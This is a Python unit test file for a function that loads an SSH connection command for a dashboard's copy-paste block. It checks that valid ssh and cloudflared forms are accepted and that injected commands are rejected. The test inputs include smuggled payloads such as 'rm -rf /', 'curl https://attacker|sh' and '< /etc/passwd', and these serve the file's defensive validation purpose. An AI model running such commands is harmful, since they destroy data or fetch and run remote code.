"""Tests for load_ssh_url - the SSH connection-string contract behind the
dashboard SSH block (issue #80). Mirrors test_load_hapi_url but the file holds a
shell command, not an HTTP URL."""
import os
import tempfile
import unittest
from pathlib import Path

from ttydproxy.views import load_ssh_url


class TestLoadSshUrl(unittest.TestCase):
    def _write(self, content):
        with tempfile.NamedTemporaryFile("w", suffix=".ssh", delete=False) as f:
            f.write(content)
            path = f.name
        self.addCleanup(os.unlink, path)
        return path

    def test_missing_file_returns_none(self):
        path = Path(tempfile.gettempdir()) / "clihost-nonexistent-ssh-file"
        if path.exists():
            path.unlink()
        self.assertIsNone(load_ssh_url(str(path)))

    def test_empty_file_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("")))

    def test_whitespace_only_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("   \n\t  \n")))

    def test_non_ssh_prefix_returns_none(self):
        self.assertIsNone(load_ssh_url(self._write("nc example.com 22")))
        self.assertIsNone(load_ssh_url(self._write("telnet example.com 22")))

    def test_bare_ssh_without_args_returns_none(self):
        # "ssh" alone is not a usable command; require "ssh " (with args).
        self.assertIsNone(load_ssh_url(self._write("ssh")))

    def test_valid_chisel_command_returned(self):
        cmd = "ssh -p 2222 hapi@example.com"
        self.assertEqual(load_ssh_url(self._write(cmd + "\n")), cmd)

    def test_valid_cloudflared_command_returned(self):
        cmd = 'ssh -o ProxyCommand="cloudflared access ssh --hostname %h" hapi@tunnel.example.com'
        self.assertEqual(load_ssh_url(self._write(cmd)), cmd)

    def test_cloudflared_form_keeps_quotes_spaces_percent(self):
        # Quotes, spaces and % must stay allowed (legitimate cloudflared form).
        cmd = 'ssh -o ProxyCommand="cloudflared access ssh --hostname %h" hapi@host'
        self.assertEqual(load_ssh_url(self._write(cmd + "\n")), cmd)

    def test_newline_injection_rejected(self):
        # A second line must not survive; the copy-paste path must stay a single
        # command (no command chaining / shell smuggling).
        injected = "ssh -p 2222 hapi@example.com\nrm -rf /"
        self.assertIsNone(load_ssh_url(self._write(injected)))

    def test_shell_metacharacters_rejected(self):
        # A copy-paste into a shell must not be able to chain a second command.
        for payload in (
            "ssh host; curl https://attacker|sh",   # command separator + pipe
            "ssh host & whoami",                    # background + command
            "ssh host `id`",                        # backtick substitution
            "ssh host $(id)",                       # command substitution
            "ssh host > /tmp/x",                    # redirect out
            "ssh host < /etc/passwd",              # redirect in
            "ssh (host)",                           # subshell
            "ssh host)",                            # unbalanced paren
            "ssh host {a}",                         # brace group
            "ssh host \\ whoami",                   # line continuation
            "ssh host $HOME",                       # variable expansion
        ):
            with self.subTest(payload=payload):
                self.assertIsNone(load_ssh_url(self._write(payload)))

    def test_control_chars_rejected(self):
        # Any control char (ord < 0x20) embedded in the command, not just
        # newline/CR/NUL. Embedded in the middle so .strip() can't hide it.
        for ch in ("\t", "\x01", "\x1f", "\x0b"):
            with self.subTest(ch=repr(ch)):
                self.assertIsNone(load_ssh_url(self._write("ssh -p" + ch + " 22 hapi@h")))

    def test_carriage_return_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@example.com\recho pwned")))

    def test_nul_byte_rejected(self):
        self.assertIsNone(load_ssh_url(self._write("ssh -p 2222 hapi@example.com\x00rm -rf /")))


if __name__ == "__main__":
    unittest.main()
